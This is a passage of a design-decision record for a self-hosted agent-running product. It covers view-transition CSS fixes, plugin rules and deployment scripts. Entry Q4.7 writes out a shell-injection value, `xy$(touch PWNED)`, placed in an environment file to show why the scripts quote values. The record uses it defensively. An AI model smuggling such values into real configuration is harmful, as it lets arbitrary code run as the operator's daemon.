client asked for nothing at all rather than asked and ignored.

**Status.** Current

#### Q3.444 — Two screens' text at once, and a sheet that left its contents behind

**Rule.** A snapshot that moves must be **opaque**, and a thing that travels as one
object must be **one snapshot**. `SHEET_BODY` carries `bg-surface`; a closing sheet
sets `view-transition-name: none` on the body so the panel goes down whole.

**Why.** Q3.442 shipped the movement and both of its surfaces were wrong, reported
from a phone as one complaint in two halves: "when settings close, all of it should
go down, not just the header — the rest looks like it disappears on the way", and
"going into a section, the previous page's text stays on screen for a while; only
the frames slide, the text appears by itself".

**A `view-transition-name` does not nest**, and that one fact is both halves. A
named element is **lifted out of** its ancestor's snapshot into a group that is the
ancestor's *sibling* in the pseudo tree, not its child. So:

- **The close.** With the body named, the panel's image was the frame with its
  contents cut out of it, and the contents were a group of their own with nothing
  animating them. Measured at 390px, two fifths of the way through a close slowed
  to 6s: the head, the rounded top and the ✕ had travelled ~12px and every row
  inside was exactly where it started. Q3.442 had noticed the group and silenced
  its fade, which made the contents hold still *crisply*; holding still was the
  defect. The name is dropped for the length of that one navigation instead —
  possible only because `router.ts` writes `data-nav` **before** calling
  `startViewTransition`, so which elements are their own snapshot is a decision
  each navigation gets to make, with nothing to undo afterwards.
- **The section.** Being lifted out also means the body stops inheriting the
  panel's fill, and `SHEET_BODY` had none of its own — so both of its snapshots
  were transparent images of glyphs, sliding over the panel's static ground.
  Measured mid-slide: the leaving list's four rows and the arriving section's
  fields were **both fully legible**, one drawn over the other. The animation was
  correct the entire time. A pane that arrives has to *cover* the one it replaces,
  which is a property of the element and not of a keyframe.

**`bg-surface` is the same colour as the panel behind it**, so nothing about the
sheet at rest changes — and it is `AppShell`'s existing rule (every surface paints
its own ground, none falls through to `body`) reaching the one box that had been
getting away with it because nothing had ever moved it before.

**`mix-blend-mode` was the obvious suspect and is not the cause.** The UA sets
`plus-lighter` on both snapshots so its default cross-fade holds up at the
midpoint, and `index.css` had `normal` on `(root)` only — which reads as an
oversight for every other name. Measured: it is not, because Chrome implements the
blend as an *animation* (`-ua-mix-blend-mode-plus-lighter`), so any rule setting
the `animation` shorthand removes it and the computed value is already `normal`
everywhere a slide is written. Recorded because the fix that "obviously" belongs
here would have been three rules of nothing.

**Asserted** in `webcheck`, off the source of truth: `SHEET_BODY` carries a
background, `index.css` drops the body's name for a close, and it still grants one
otherwise. Each was checked by reintroducing the defect and watching the assertion
fail.

**Status.** Current

#### Q3.445 — `@media` adds no specificity, so the desktop kept every phone animation

**Rule.** Every `index.css` rule that animates a view-transition snapshot is keyed
on `:root[data-nav…]`, and `webcheck` asserts it as a property over the file rather
than pinning the two rules that were wrong.

**Why.** Reported as "there should be no slides on a computer, that is for mobile
only" — against a file that already contained `@media (min-width: 64rem) {
::view-transition-old(root) { animation: none } }` and had done since Q3.438.

**The rule was dead.** A media query changes *when* a rule applies and contributes
nothing to specificity. The exemption was written as a bare pseudo-element —
`(0,0,1)` — against the `:root[data-nav="push"]::view-transition-old(root)` it had
to overrule, which is `(0,2,1)`. It lost at every width. Measured at 1280px with a
synthetic `data-nav="push"`: `nav-enter` and `nav-under` running on the root pair,
so a rail user opening their first conversation had the whole window slide in from
the right. `@media (prefers-reduced-motion: reduce)` at the foot of the file had
the identical hole, and was doubly invisible because `announce` declines to start a
transition in that case at all — the belt beside a brace, and not a belt.

**`:root[data-nav]`** — the attribute without a value — costs the same `(0,2,1)` as
the rules it overrules and wins on source order, which is the thing a reader can
actually see. One selector still covers all four movements rather than four copies
to keep in step.

**The assertion is the class of bug, not the instances.** Two named checks would
have passed on a file that had grown a third under-specific gate. So `webcheck`
extracts every rule in `index.css` whose selector names a view-transition
pseudo-element and whose body sets `animation`, and requires all of them to start
with `:root[data-nav` — which puts them at one specificity, where order decides.
Rules setting `mix-blend-mode` or `z-index` are not scanned: nothing overrules
those by width.

**A third slide was found by the same measurement and is fixed here.**
`sheet-close` was gated at no width at all, so a *desktop* dialog threw itself a
full screen height downwards out of the middle of the window. It now leaves the way
`rise` brought it in above `sm`, matching `animate-sheet sm:animate-rise` on the way
in. The scrim is deliberately not gated with it — it fades in at every width, and a
fade is not what was being refused.

**Measured after**, by probing `document.getAnimations()` at 1280px and 390px for
all five movements: the desktop runs nothing on the root pair, nothing on the
sheet's body, and `rise` rather than `sheet` on a close; the phone runs
`nav-enter`/`nav-under` on the root, the same pair on the sheet's body for a
section, and `sheet` with **no body group at all** for a close.

**Status.** Current


#### Q3.446 — Four places a plugin may appear. Why is the set closed?

**Rule.** A screen, a settings pane, an action on a session's menu, and
server-side hooks. There are no others, and adding one is a decision rather than
an implementation.

**Why.** This client is shaped around one question — *does anything anywhere need
me* — and the three signals answering it are held together by `waitingFloor`,
which is computed by **subtraction**: everything blocked, minus everything this
view can draw. That is what makes it impossible for a new section, filter or
needle to open a gap by accident. A contribution point able to insert rows into
the session list would be a contribution point able to open exactly that gap, and
nothing downstream could see it.

The four that exist all sit somewhere the subtraction does not reach: a sheet, a
settings pane, a row below everything the app draws itself, and the server.

**Rejected, with the seams named rather than half-built.** A card in the
transcript (`renderEvent` in `EventList.tsx`) and a slash command
(`buildCommands` in `ui/commands.ts`). Both are recorded as non-goals in Q7.105
with their addresses, so widening later is an addition rather than a rewrite.

**Status.** Current

#### Q3.447 — Where does a plugin's screen live?

**Decision.** A plugin's **settings** are at
`/settings/machines/:machineId/plugins/:pluginId`, inside the machine, beside that
machine's agents. Its **screen** is at `/p/:machineId/:pluginId`, a route-backed
sheet of its own.

**Why the settings are inside a machine.** `MachineAgentsSection`'s argument,
unchanged: what is configured lives in one daemon's database and on one host's
disk, so a fleet-wide screen would have to open with a machine dropdown — a screen
asking a question its own copy answers. A plugin's code and its stored data are
per-machine in exactly the way an agent's credentials are.

**Why the screen is not there too.** They are different things. Settings are
configuration, visited when something needs changing. A board is opened several
times a day, from a phone, to look at — and four taps into a settings sheet is
filing a bookmark under a preference. `/p/…` is short because it is typed and
shared.

**What it inherits by being a route.** Deep links, survival across the reload a
phone performs on its own, and the Back button closing it for free. `isSheet` and
`isOverlayPath` both had to learn it, and `webcheck` asserts they agree — a route
in one and not the other is a pop-up that either forgets what it was drawn over or
records one while being a screen.

**Rejected.** A fifth top-level settings section. The machine is where the answer
already lives, and a section would have needed the dropdown.

**Status.** Current

#### Q3.448 — What does a narrowing over a plugin's output owe?

**Rule.** Everything in `packages/web/src/plugins.ts` fails open. An unknown block
is dropped, an unknown field kind becomes a text input and still round-trips, a
missing string becomes an empty one, and nothing throws.

**Why this is rule 2 again rather than a new rule.** `compatibility.md` already
says an unknown value must fail toward "keep working", and the failure that taught
it is on record: `endedWithDaemon` asked "is this a daemon reason?", answered *no*
for a reason it had never heard of, and took the composer off the screen for a
conversation that was coming back.

**Why it binds harder here.** A plugin is a **third** release schedule. The web
client ships with the control plane weekly, a daemon ships when its owner runs
`deploy.sh`, and a plugin ships when its author feels like it — coordinated with
neither. So a client meeting output it does not recognise is not an edge case, it
is Tuesday.

**The direction of every guess is chosen.** An unrecognised tone falls to the
ordinary one, which means a plugin can fail to make a control *look* dangerous and
cannot make a destructive one look harmless.

**Status.** Current

#### Q3.449 — What may a plugin's screen draw before the plugin has answered?

**Rule.** Nothing. No skeleton board, no optimistic row, no locally applied
action.

**Why, and why it differs from the config chip.** The app does draw optimistically
in one place — a config choice, where `withChoice` overrides the drawn value and
nothing is claimed about what the *agent* is doing (Q3.408). The line that
decision drew is exactly the one here: a client may draw a local intention it can
retract, and may never draw an assertion about what something else did.

A plugin's view **is** that assertion. It is the plugin's statement about its own
state, computed from data this client has no second copy of, so there is nothing
to guess from and nothing to retract. Pressing something therefore replaces the
view with what came back — which is also why an action may return a whole view
rather than only a sentence, and why a row disappears rather than being reported
gone.

**Where a clamp is drawn instead.** A view over the bounds is cut and a notice is
appended saying so. A list silently shortened is a list showing a wrong number,
and the person reading it has no way to find out.

**Status.** Current


#### Q3.450 — Where may a plugin send somebody?

**Rule.** A row names `{session}` or `{screen}`. It cannot name a URL, and
`{url: …}` is not a shape — it narrows to `null` and the row is simply not
tappable.

**Why.** A board whose cards could not open the session they are about was a dead
end, so the capability had to exist; the question was only how wide. Two things
close it at "destinations this app already has". A link chosen by a plugin is a
phishing surface **on the page that approves shell commands** — the one page in
this product where being somewhere unexpected is expensive. And "a plugin deciding
where somebody goes" was already refused for a session-menu action, so allowing it
here would have made that refusal arbitrary rather than a rule.

What is permitted is a pointer into what the plugin can already *read*: a plugin
holding `sessions.read` knows those ids, and opening one is what a board is for.

**Narrowed twice, deliberately.** On the daemon in `clampView`, and again in
`packages/web/src/plugins.ts`. `wire.ts` is a hand mirror, so a client trusting
the daemon's narrowing would be trusting a copy of a rule rather than the rule;
`daemoncheck` and `webcheck` each drive their own side against a URL in both
shapes somebody would try it.

**A `<button>` rather than an `<a>`**, because there is no href — the destination
is resolved at the call site from an id. Pretending otherwise would put a
middle-clickable link on the one thing this entry exists to keep from being one.

**Status.** Current

#### Q3.451 — A plugin screen was a photograph. What made it a window?

**Rule.** A view may declare `refreshMs`. The host floors it at
`PLUGIN_REFRESH_MIN_MS`, caps it, and spends it **only while somebody is looking**
— stopped on `document.hidden`, stopped when the sheet closes.

**Why it was needed.** The screen read once, when it was opened, and was stale
from the next turn onward. For a board whose entire job is watching agents work,
that is the wrong medium: it was a photograph of the moment the sheet opened.

**Why polling rather than a subscription.** A push would mean the daemon holding a
per-plugin channel open to every tab, and a new frame type on a socket that is
deliberately read-only. This is a `GET` the client already makes, on a screen that
is on the screen. The cost is bounded by the same thing that bounds its value:
nobody is looking at a background tab.

**Two rules that make it usable rather than merely correct.** A refresh **never
blanks the view** — the old one stays until the new one arrives, or the board
flashes every five seconds. And a failed refresh is **silent**: a machine dropping
off LTE for one tick is not news, and a board that replaced itself with an error
every time a train entered a tunnel would be worse than one briefly stale.

**Clamped silently, unlike a cut list.** The difference is what anybody could do
about it: a shortened list is a wrong number on screen, while an interval moved
from 500 ms to 2 s is invisible to everyone and actionable by nobody.

**A settings pane is not refreshed, whatever it asks.** It is a form somebody is
typing into, and re-reading it under them either discards what they typed or keeps
it over a value the plugin has since changed.

**Status.** Current

## Deployment, packaging and code layout

### Q4.1 — Is this one deployment or two, and why can the two services not be checked out separately?

**Decision.** It ships as two deployments from one repository. The repository is
shared because `packages/control-plane` imports the root `src/` through
`../../../src/token.js` and friends, so neither half can be checked out alone.
`install.sh` takes **one** service per run.

**Why.** Nothing else about the two matches: one is per fleet and holds the
signing key, the other is per host and runs agents on it; one builds the web UI
it serves and the other builds nothing at all; one typically sits on a Linux box
with a public address, the other behind NAT next to the code. Neither host
should acquire a unit for a service it will never start. Before this existed,
both services were started by hand under `tsx` and nothing brought them back
after a reboot, a logout or a crash — the project was described as having "no
fleet, no agent and no deploy", which was true of the *drivers* and was read as
describing the product.

**Status.** Current

### Q4.2 — Why is the control plane a container when the daemon is not?

**Decision.** The split is a split in kind: the control plane is a container
image, the daemon is a plain process under a supervisor.

**Why.** This is not a preference about packaging; it is the confinement
question answered twice. The daemon spawns agents as children of itself, under
the operator's own uid, with their `HOME` and their repositories — a container
there was abandoned rather than superseded, because it was in the way of
everything the product is. The control plane is the opposite kind of process, so
the boundary that was in the way there is free here, and it buys something
specific: the process holding the Ed25519 key that mints every token in the
fleet stops running as the operator, next to a daemon that deliberately gives
agents that uid. An agent that can read `~/.reemoat/control-plane.db` *is*
every user in the fleet.

**Measured.** The control plane spawns nothing —
`grep -rn "child_process\|spawn(" packages/control-plane/src` is empty. It
touches its SQLite file, the `schema.sql` beside its own module and a read-only
directory of assets, and its only native dependency is esbuild arriving under
`tsx`.

**Status.** Current

### Q4.3 — How is the containerised control plane operated, and where are its operational costs written down?

**Decision.** `deploy/compose.sh` is the one way in, `deploy/docker/README.md`
is where that service's deployment is documented, and there is no supervisor
unit for it.

**Why.** Three costs are stated in that README rather than in the decision
record because they are operational rather than design: on macOS the database
moves inside the VM, and a sleep/wake introduces a clock boundary against 300s
tokens; and on Linux **a published port bypasses ufw and firewalld** — on the
port that carries `/v1/admin/*`.

**Status.** Current

### Q4.4 — Is `install.sh` a wizard or an installer?

**Decision.** Both, decided by whether a terminal is attached at both ends. On a
terminal it runs an interview; without one it is a plain installer.

**Why.** It is the same question the login wizard's pty answers on the other
side, for the same reason: a daemon's stdin is never a terminal. The mode split
is what let the interview be added without losing the property that mattered
first — a non-interactive run still writes the environment file from the
example, renders the unit, and refuses to start an unconfigured service, so this
stays callable from CI.

**Status.** Current

### Q4.5 — What does the interview buy that a README checklist could not?

**Decision.** The fleet wiring. The control plane's wizard **catches the admin
API key**; the daemon's wizard, on a host that already has a control plane, runs
`addmachine` and `enroll` itself. That offer appears *only* when
`~/.reemoat/cpctl.env` exists.

**Why.** The control-plane process prints the admin API key exactly once on its
first start and stores only a hash of it — under a supervisor that "once" goes
to a log file, so a wizard that did not go and read it would have converted a
documented one-time print into a credential nobody ever sees. The enrollment
half replaces asking somebody to copy a code between two terminals. Minting a
code is an admin call, so it is offered exactly in the case where the admin key
is already at hand.

**Status.** Current

### Q4.6 — Why does the wizard ask about every listener and every route it creates?

**Decision.** Every listener and route the wizard creates is a question, and
choosing relay-only writes `REEMOAT_HOST=127.0.0.1` and `REEMOAT_PORT=0`. The
control plane's run also offers to build `packages/web` when there is no `dist`,
and ends by printing an API key described as what somebody pastes into it.

**Why.** The defaults are wider than the question they follow, and three were
being decided silently. `REEMOAT_CP_RELAY_HOST` defaults to `0.0.0.0` in
`main.ts` and the relay block wrote only the port and the URL — so an operator
who had just chosen "this machine only (127.0.0.1) — safest" for the API ended
with a second listener on every interface and no line in the environment file
recording it, which is the only artifact they ever re-read. `addmachine` was
called with no `--url`, which the control plane stores as `null` (relay-only),
while `.env.example` left the daemon on `0.0.0.0:7887` — a listener on every
interface that the registry says does not exist, plus a hard dependency on a
relay the wizard never checks is enabled. Clearing `baseUrl` alone is not the
lever; loopback binding is. And this service is the only thing that serves the
UI, so a missing `dist` is a wizard-time question rather than a 404 later.

**Status.** Current

### Q4.7 — How is a value written into an environment file quoted?

**Decision.** Single-quoted, always, through `sq`. The replacement path does not
use `awk -v`.

**Why.** Those files are `.`-sourced by `run-daemon.sh`, so an unquoted value is
shell *source* rather than data. Every value comes from `ask` — a URL, a bind
address, a machine name, a pasted enrollment code — so the ordinary failure is a
`&` or a space crash-looping the service with `b: command not found` in a log,
and **the ceiling is arbitrary code executing as the daemon that runs the
operator's agents.** `awk -v` escape-processes its value, so the two characters
`\n` injected a second assignment on the replacement path while the append path
wrote them literally: one function with two answers to what a value is.

**Measured.** `REEMOAT_ENROLL_CODE=xy$(touch PWNED)` written unquoted created
the file `PWNED` on source and left the code as `xy`.

**Status.** Current

### Q4.8 — What order does the unit's PATH put directories in, and is the ordering the fence?

**Decision.** The unit's PATH puts the system directories first and appends the
resolved tool directories after them. `runtime_path` then re-resolves every tool
under the PATH it built, **states** any disagreement, and puts that tool's
directory back in front. It does not refuse. `REEMOAT_UNIT_PATH` overrides the
whole computation.

**Why.** The ordering used to be the other way round, which was a privilege path
rather than a preference — but **the hazard named out loud is the directory
being writable by more than its owner, not the ordering itself.** On a
development machine `node` resolves to a package-manager prefix such as
`/opt/homebrew/bin/node`, and that directory is `drwxrwxr-x` — group-writable by
every administrator account. Ahead of `/usr/bin` it shadowed `/usr/bin/git`, and
`src/git.ts` spawns bare `"git"`, against the operator's own repositories, with
their own hooks and LFS filters now running, as the daemon that runs their
agents. That consequence got *worse* when the container went away rather than
better. Appended instead, such a directory can shadow nothing. The reorder must
not silently change *which* node runs, which is what the re-resolution is for.

**Rejected.** Refusing on a disagreement was the first attempt and was removed.
On a repository needing node >= 24 a second node is the common case rather than
a corner one, and the refusal's own remedy was unreachable: `_acc` always begins
with the system directories, so the suggested `PATH=<dir>:$PATH` re-run produced
the identical refusal for ever and only deleting a distro package escaped it —
landing, on `deploy.sh`, after `git reset --hard`.

**Status.** Reversed an earlier decision

### Q4.9 — How much does `deploy/` know about the host it runs on?

**Decision.** Nothing. The repository root comes from the script's own location,
`node` and `git` are found with `command -v` and their resolved directories are
baked into the unit, and the environment file paths are overridable.

**Why.** This is not tidiness. `PATH` is the single commonest way a deployment
of this shape fails, because launchd and systemd read no profile, and a unit
naming a fixed prefix such as `/opt/homebrew/bin` works on exactly one kind of
machine. The operator is not the author.

**Status.** Current

### Q4.10 — What restarts after a deploy, and why is it gated?

**Decision.** Restart is gated on what the diff actually touched: `src/**`
affects both services, `packages/control-plane/**` only the control plane,
`scripts/daemon.ts` only the daemon. `deploy.sh` prints the daemon's cost
*before* it acts, not after.

**Why.** A restart is not free, and the two costs differ. The control plane's
costs an outage of every relay tunnel — they reconnect on their own, which is
what the full-jitter backoff is for. The daemon's costs **every live session**:
they come back `interrupted`, and an approval that was pending is gone, because
a permission holds a live `resolve` closure that cannot be serialized.

**Status.** Current

### Q4.11 — Why are the two services' change lists different widths?

**Decision.** One diff produces two artifacts — the daemon restarts a process,
the control plane rebuilds an image and recreates a container — and the input
list for each is decided by the cost of being wrong. `RESTART_DEPS` stays the
root `package.json` alone; the image's input list is deliberately wider,
including `pnpm-lock.yaml` and `packages/web/**`.

**Why.** A `lucide-react` bump must not interrupt a live session, while
recreating a container costs only tunnels that reconnect by themselves. The
asymmetry is the design rather than an inconsistency.

**Status.** Current

### Q4.12 — What was given up by building the web bundle into the image?

**Decision.** A change confined to `packages/web` is now a rebuild and a
recreate. It used to restart **nothing**.

**Why.** The old property was a direct consequence of the SPA fallback
re-reading `index.html` from disk per request rather than holding a copy from
startup. That invariant is still true and is simply no longer exploited. There
is no escape hatch today: `REEMOAT_CP_WEB` names a path *inside* the container,
and nothing mounts a host directory there, so pointing it at one produces a 404
rather than the old behaviour.

**Rejected.** Bind-mounting `dist` from the host would keep the old property, at
the price of the image no longer being the deployment.

**Status.** Known limitation

### Q4.13 — What decides whether the container is recreated?

**Decision.** What the image *is* — its layers and its config, through
`cp_image_fingerprint` — and not the path list. A rebuild whose layers all came
from cache produces byte-identical layers and config, and nothing is recreated.

**Why.** A measurement of the artifact is right where a regex over paths is a
guess. It errs safely: a cold cache says "changed" when nothing did, and
`compose up -d` is idempotent, so the cost of a wrong guess is one honest log
line.

**This said "the image id" until 2026-08-11 and that was measured false.** On
Docker Compose v5.1.2 / buildx 0.33.0 with the containerd image store,
`docker image inspect --format '{{.Id}}'` returns the digest of the OCI *index*
(`application/vnd.oci.image.index.v1+json`, 856 bytes). Three consecutive
fully-cached builds of an unchanged tree gave three different `.Id` values while
`.Created`, every entry of `.RootFS.Layers` and the whole of `.Config` were
byte-identical. The build log names the moving part: across two such builds
`exporting config` and `exporting manifest` print the same digest and
`exporting attestation manifest` prints a different one each time, so the index
listing it moves too. The id tracked the wrapper, not the image.

The consequence was one-directional and therefore invisible: every deploy that
ran a build recreated `control-plane`, and Q4.16's `and` degraded to
`RELAY_INPUTS` alone. Neither is unsafe, which is why nobody found it; the
sentence was simply not true. Found by running `deploy.sh --force` on a tree that
had just been deployed and reading `image: moved`.

**Rejected: `provenance: false` on the compose build.** The schema accepts it —
`compose config` echoes the field — and the attestation manifest is exported
regardless, so the id still moved across three builds with it set. Suppressing
the export would mean reaching past compose into the builder; comparing the right
thing does not, and is also correct on a classic image store, where `.Id` happens
to be the config digest and stable. The line was taken back out rather than left
in as a change that reads like a fix.

**Status.** Reversed an earlier decision

### Q4.14 — Are "install a dependency" and "restart a service" the same trigger?

**Decision.** They are separate triggers. `RESTART_DEPS` is the root
`package.json` alone, because that is the only manifest naming what the daemon
loads. `pnpm-lock.yaml` is deliberately not a restart trigger.

**Why.** Collapsing them was a real defect rather than a simplification. One
pattern used to serve both and it matched `packages/[^/]+/package\.json` — so a
`lucide-react` bump fed straight into the daemon's restart test and turned every
live session `interrupted`, dropping every pending permission, to deliver a
change to a bundle the daemon does not serve. The lockfile has the same fault
one level down: it moves for any package in the workspace. The cost is stated
rather than hidden — a transitive dependency of the daemon that moves in the
lockfile alone reaches the running process at its next restart, which is what a
running process does with its already-loaded modules regardless.

**Status.** Current

### Q4.15 — Is `deploy/` exempt from its own gating?

**Decision.** No. `^deploy/` is a trigger, `render_unit` lives in `lib.sh`
rather than in `install.sh`, and a template change re-renders **and reloads**
through `svc_reload`.

**Why.** Nothing matched `^deploy/` before, so a changed `run-daemon.sh` shipped
and applied only if some unrelated file happened to force a restart, and a
changed unit template took effect *never* — `deploy.sh` does not call
`install.sh`, so nothing on the update path re-rendered. Reloading has to be its
own verb, which `install.sh`'s claim that "re-running re-renders the unit, which
is how a moved repository or a changed node install is picked up" quietly
depended on and did not have.

**Measured.** On both supervisors: launchd's `bootstrap` errors on an
already-bootstrapped label and is swallowed, and neither `kickstart` nor
`kickstart -k` re-reads the plist; systemd's `enable --now` is a no-op against a
running unit. So that claim was false on both until `svc_reload` existed.

**Status.** Current

### Q4.16 — What happens when one service fails during a deploy of a host running both?

**Decision.** Failures are collected and decide the exit status at the end
rather than aborting the run. `install.sh` does the same.

**Why.** `wait_healthy` and `svc_restart` return non-zero, and as plain
statements under `set -e` they ended the loop — and `TARGETS` is built by
iterating `SERVICES="daemon control-plane"`, so on a host running both, a daemon
that failed its probe meant the control plane was never restarted at all, after
`git reset --hard` had already moved the checkout, with `deployed <sha>` never
printed to say so. `install.sh`'s reason is sharper still: everything worth
doing there happens *after* the health probe, above all catching the one-time
admin key.

**Status.** Current

### Q4.17 — Does `deploy.sh` run against a dirty working tree?

**Decision.** It refuses.

**Why.** It runs `git reset --hard`. The advice it replaces — "keep production
in its own clone" — only ever protected the operator who followed it. A refusal
protects the one who ran it in the directory they develop in, which on a host
where the daemon lives next to the work is the likeliest mistake there is.

**Status.** Current

### Q4.18 — Where is `UV_THREADPOOL_SIZE` set?

**Decision.** Twice, and the shell one is the reliable half.
`deploy/run-daemon.sh` and the `daemon` script in `package.json` export it
before `node` starts; `scripts/daemon.ts` also assigns it at the top of the
module body. The daemon prints the value it actually got in its banner.

**Why.** libuv reads the variable once, lazily, when the first piece of work
reaches the pool. In ESM the module body runs *after* every `import` above it,
so the in-process assignment only lands while nothing in the import graph
touches the threadpool during loading — a property of the current dependencies
rather than a guarantee, and one that would fail silently, since a single future
import that reads a file asynchronously at load time latches the pool at 4 and
nothing says so. Exporting before `node` starts is the placement nothing can
outrun. It matters because every `node:fs/promises` call draws from that pool
and a stalled network mount holds a slot for the life of the process: at 4, two
bad directories stop every later `await` on the filesystem while `/health`,
which touches no files, reports the daemon up.

**Measured.** 2026-08-03, against the real import list: 16 concurrent `pbkdf2`
jobs take ~150ms with the assignment and ~240ms with the pool forced to 4, so
the in-process assignment is taking effect today.

**Status.** Current

### Q4.19 — When is a deploy considered finished?

**Decision.** At `/health`, not at the supervisor. Both services answer it
unauthenticated. The address comes out of the service's own env file, and
`REEMOAT_PORT=0` is reported as skipped rather than probed.

**Why.** Every way either service fails at startup — a missing
`REEMOAT_TOKEN`, a port already bound, a database another daemon holds —
happens *after* the unit has been accepted, so a supervisor that accepted the
unit proves nothing. Reading the address out of the env file means a moved port
is not a false red, and a relay-only daemon has no port to know.

**Status.** Current

### Q4.20 — Where is a unit staged when it is not going to be started?

**Decision.** In `~/.reemoat/`, outside the directory the supervisor scans.
Still rendered, still inspectable, not armed, and removed once the real unit is
installed.

**Why.** launchd bootstraps every plist in `~/Library/LaunchAgents` at login and
the template carries `RunAtLoad`, `KeepAlive` and `ThrottleInterval 10` — so
rendering one there and printing "Not starting" produced exactly the ten-second
crash loop that message exists to avoid, beginning at the next reboot, silently.
systemd does not autostart an un-enabled unit, so one code path behaved
oppositely on its two halves. Staging outside the scanned directory entirely is
the fix rather than a non-`.plist` extension, because `launchd.plist(5)` says a
plist is only *expected* to end in `.plist`, and a convention is not a promise
to build a safety property on.

**Status.** Current

### Q4.21 — How does a run decide whether the service is already configured?

**Decision.** The test is "the environment file is still byte-for-byte the
example", and the interview writes to a copy which is moved into place after the
last question.

**Why.** The first version tested "this run created it", which let a wizard
interrupted at a prompt leave the example in place, so the *next* run skipped
both the interview and the guard and started a daemon with no `REEMOAT_TOKEN`.
`cmp` alone was still not enough, which is the correction worth keeping:
`ask_control_plane` writes the bind address and *then* asks for the port, so an
interrupt in between left a file that differed from the example and the next run
skipped everything anyway — this time starting a half-configured service.
Writing to a copy is what makes the comparison mean what it says.

**Status.** Current

### Q4.22 — Which streams does the interview's tty test check?

**Decision.** stdin and stderr.

**Why.** Every prompt is written to stderr and only `ask`'s return value goes to
stdout, so testing `-t 1` asked about the one stream the wizard does not use.
`deploy/install.sh control-plane | tee install.log` — which is what somebody
following a README does — silently became the plain installer: no interview, no
start, no admin-key capture, exit 0.

**Status.** Current

### Q4.23 — When does `deploy.sh` resolve its tools, and what does it say before acting?

**Decision.** It resolves git and pnpm before it touches the checkout, prints
the committer and subject of the target commit, and honours
`REEMOAT_DEPLOY_REQUIRE_SIGNATURE` where a signing policy exists. A failure
after the reset prints what state it left behind and the two ways out rather
than exiting bare.

**Why.** It shells out to both tools and used to resolve neither, so a missing
one surfaced *after* `git reset --hard` had moved the tree. The default ref is a
mutable branch and the next step executes that tree's lifecycle scripts on a
host that runs agents under the operator's own uid, so what is about to run is
worth naming before it runs.

**Status.** Current

### Q4.24 — Is the health probe `curl` alone?

**Decision.** No — node performs the probe, and there are three distinct skips,
none of which fails a deploy: no environment file, an environment file that will
not source, and `REEMOAT_PORT=0`.

**Why.** Reading only an exit status made "curl is not installed" (127), a
hostile proxy environment and a dead service one outcome — announced 30 seconds
later and then deciding the exit status of the whole deploy. curl ships on stock
macOS and most distributions but not on a slim Debian or Alpine, which is the
shape of host a control plane runs on; node is already a hard requirement, which
is the same argument `json_field` makes against needing jq.

**Status.** Current

### Q4.25 — Is there continuous deployment?

**Decision.** No. Deploying is a separate act from checking and nothing
automates it. The hook for adding it later is a job that calls
`deploy/deploy.sh --ref <sha>`.

**Why.** A self-hosted runner would work — it dials out, so NAT is no obstacle —
but on a host where somebody develops and runs agents at once, every push to
`main` would interrupt every turn in flight and drop every pending approval — see
Q4.10 for why that is the cost rather than the sessions themselves, which come
back `interrupted` and resume. A push is not a rare event on such a host, so the
price is paid several times an hour. Keeping the logic in the script rather than
in a workflow is what makes adding CD later a change to *when* deployment
happens and not to what it is.

**Status.** Not built

### Q4.33 — Why is the relay its own service, and what does that actually buy?

**Decision.** The relay runs in a second container from the same image, started
with `src/relay/main.ts`, and `deploy.sh` recreates it only when the image moved
**and** the diff touched `RELAY_INPUTS`.

**Why.** The two halves have opposite restart costs and one container made the
cheap one pay the expensive price. `CP_IMAGE_INPUTS` includes `^packages/web/`
and `^packages/control-plane/`, so a CSS change rebuilt the image, moved its id,
and `svc_restart control-plane` recreated the container holding every tunnel in
the fleet. The API's inputs move constantly; the relay's move rarely.

**Measured.** What one recreate cost an open session: container downtime, plus
**0–30s of dead time** after the relay was listening again — the daemon has been
burning full-jitter backoff against a refused port and there is no "the relay is
back" signal — plus up to ~10s of the browser's own stream retry, each of whose
attempts re-probes `/health` through the relay and gets `503 no_tunnel` until the
daemon reconnects. So ~10–45s of "reconnecting" per session. Every in-flight
request died: `teardown()` destroys every live loopback socket with no drain, and
non-idempotent requests are deliberately never replayed. An approval **tapped
during** the window failed and had to be tapped again.

**What was not lost, said so the cost is not overstated:** nothing. Transcripts
are SQLite on the *daemon's* disk and are never truncated; the browser holds
`lastAppliedSeq` and reattaches with `?since=`; the control plane's own state is
on a named volume, so no token was invalidated and nobody was signed out. A
pending permission survives too — it lives in the daemon, which is not restarted.
The cost was availability, and it was paid on every deploy.

**Rejected: two images.** The relay's code is a subset of what is already copied
in, so a second Dockerfile target would be a third place the file list is written
down — this repository has already paid for having it in two (`.dockerignore` and
the COPY lines), and `imagecheck` exists because of it. One image with two
commands means the image id can no longer decide whether the relay is recreated,
which is what `RELAY_INPUTS` is for.

**Rejected: the relay on another host.** It would lose the shared SQLite, so
authorization would need either a per-request call back to the API — which puts
the API on the data path and is strictly worse than today — or a replicated copy
of users, machines and grants. Same host, one volume, WAL.

**Status.** Current

### Q4.34 — Why does the relay need both a path list and the image id?

**Decision.** `relay` is recreated when the image id moved **and** `RELAY_INPUTS`
matched, or when `compose.yml`/`compose.sh` changed, or under `--force`.
`deploycheck` walks the import closure of
`packages/control-plane/src/relay/main.ts` and fails on any file the pattern does
not cover.

**Why.** Each term covers the other's failure. The image alone — Q4.13's rule,
which is right for the control plane — recreates the relay for a CSS change,
which is the entire cost this split exists to stop paying. `RELAY_INPUTS` alone
is a path regex deciding what a build produced, which is the guess Q4.13 replaced
with a measurement: a fully-cached rebuild produces byte-identical layers and
config, and nothing needed recreating. Until Q4.13's own correction on
2026-08-11 the first term was `.Id` and therefore true on every build that ran,
so this `and` was in practice `RELAY_INPUTS` alone — right by luck, since that is
the term protecting the tunnels, but not what was written.

The direction that matters is **too narrow**, and it is silent: a file the relay
is built from that the pattern does not name means a deploy that updates the API,
leaves the relay on old code, and prints "the tunnels stay up" about a relay that
should have been replaced. That is the same shape as the `.dockerignore`/COPY
pair, so it is not maintained by inspection — hence the closure walk, which is
also why `webcheck` reads `cpctl.ts` off disk rather than restating it.

**Measured.** The closure is fourteen files: the six under
`packages/control-plane/src/relay/`, `store.ts`, `keys.ts`, and five in the root
`src/`. It does **not** reach `app.ts`, `settings.ts`, `mail/*` or `password.ts`,
which is what makes an ordinary API deploy free.

`schema.sql` is on the list and no closure would show it — it is read through
`new URL(…, import.meta.url)`, and it is the skew that fails at *runtime*: the
relay holds prepared statements against tables the API may have migrated.

**Status.** Current

### Q4.35 — Can a live tunnel be moved out of a process, or survive one?

**Decision.** No. Only its *presence* is written down, in `relay_tunnels`.

**Why.** A tunnel is a TLS-wrapped WebSocket carrying an HTTP/2 session: a kernel
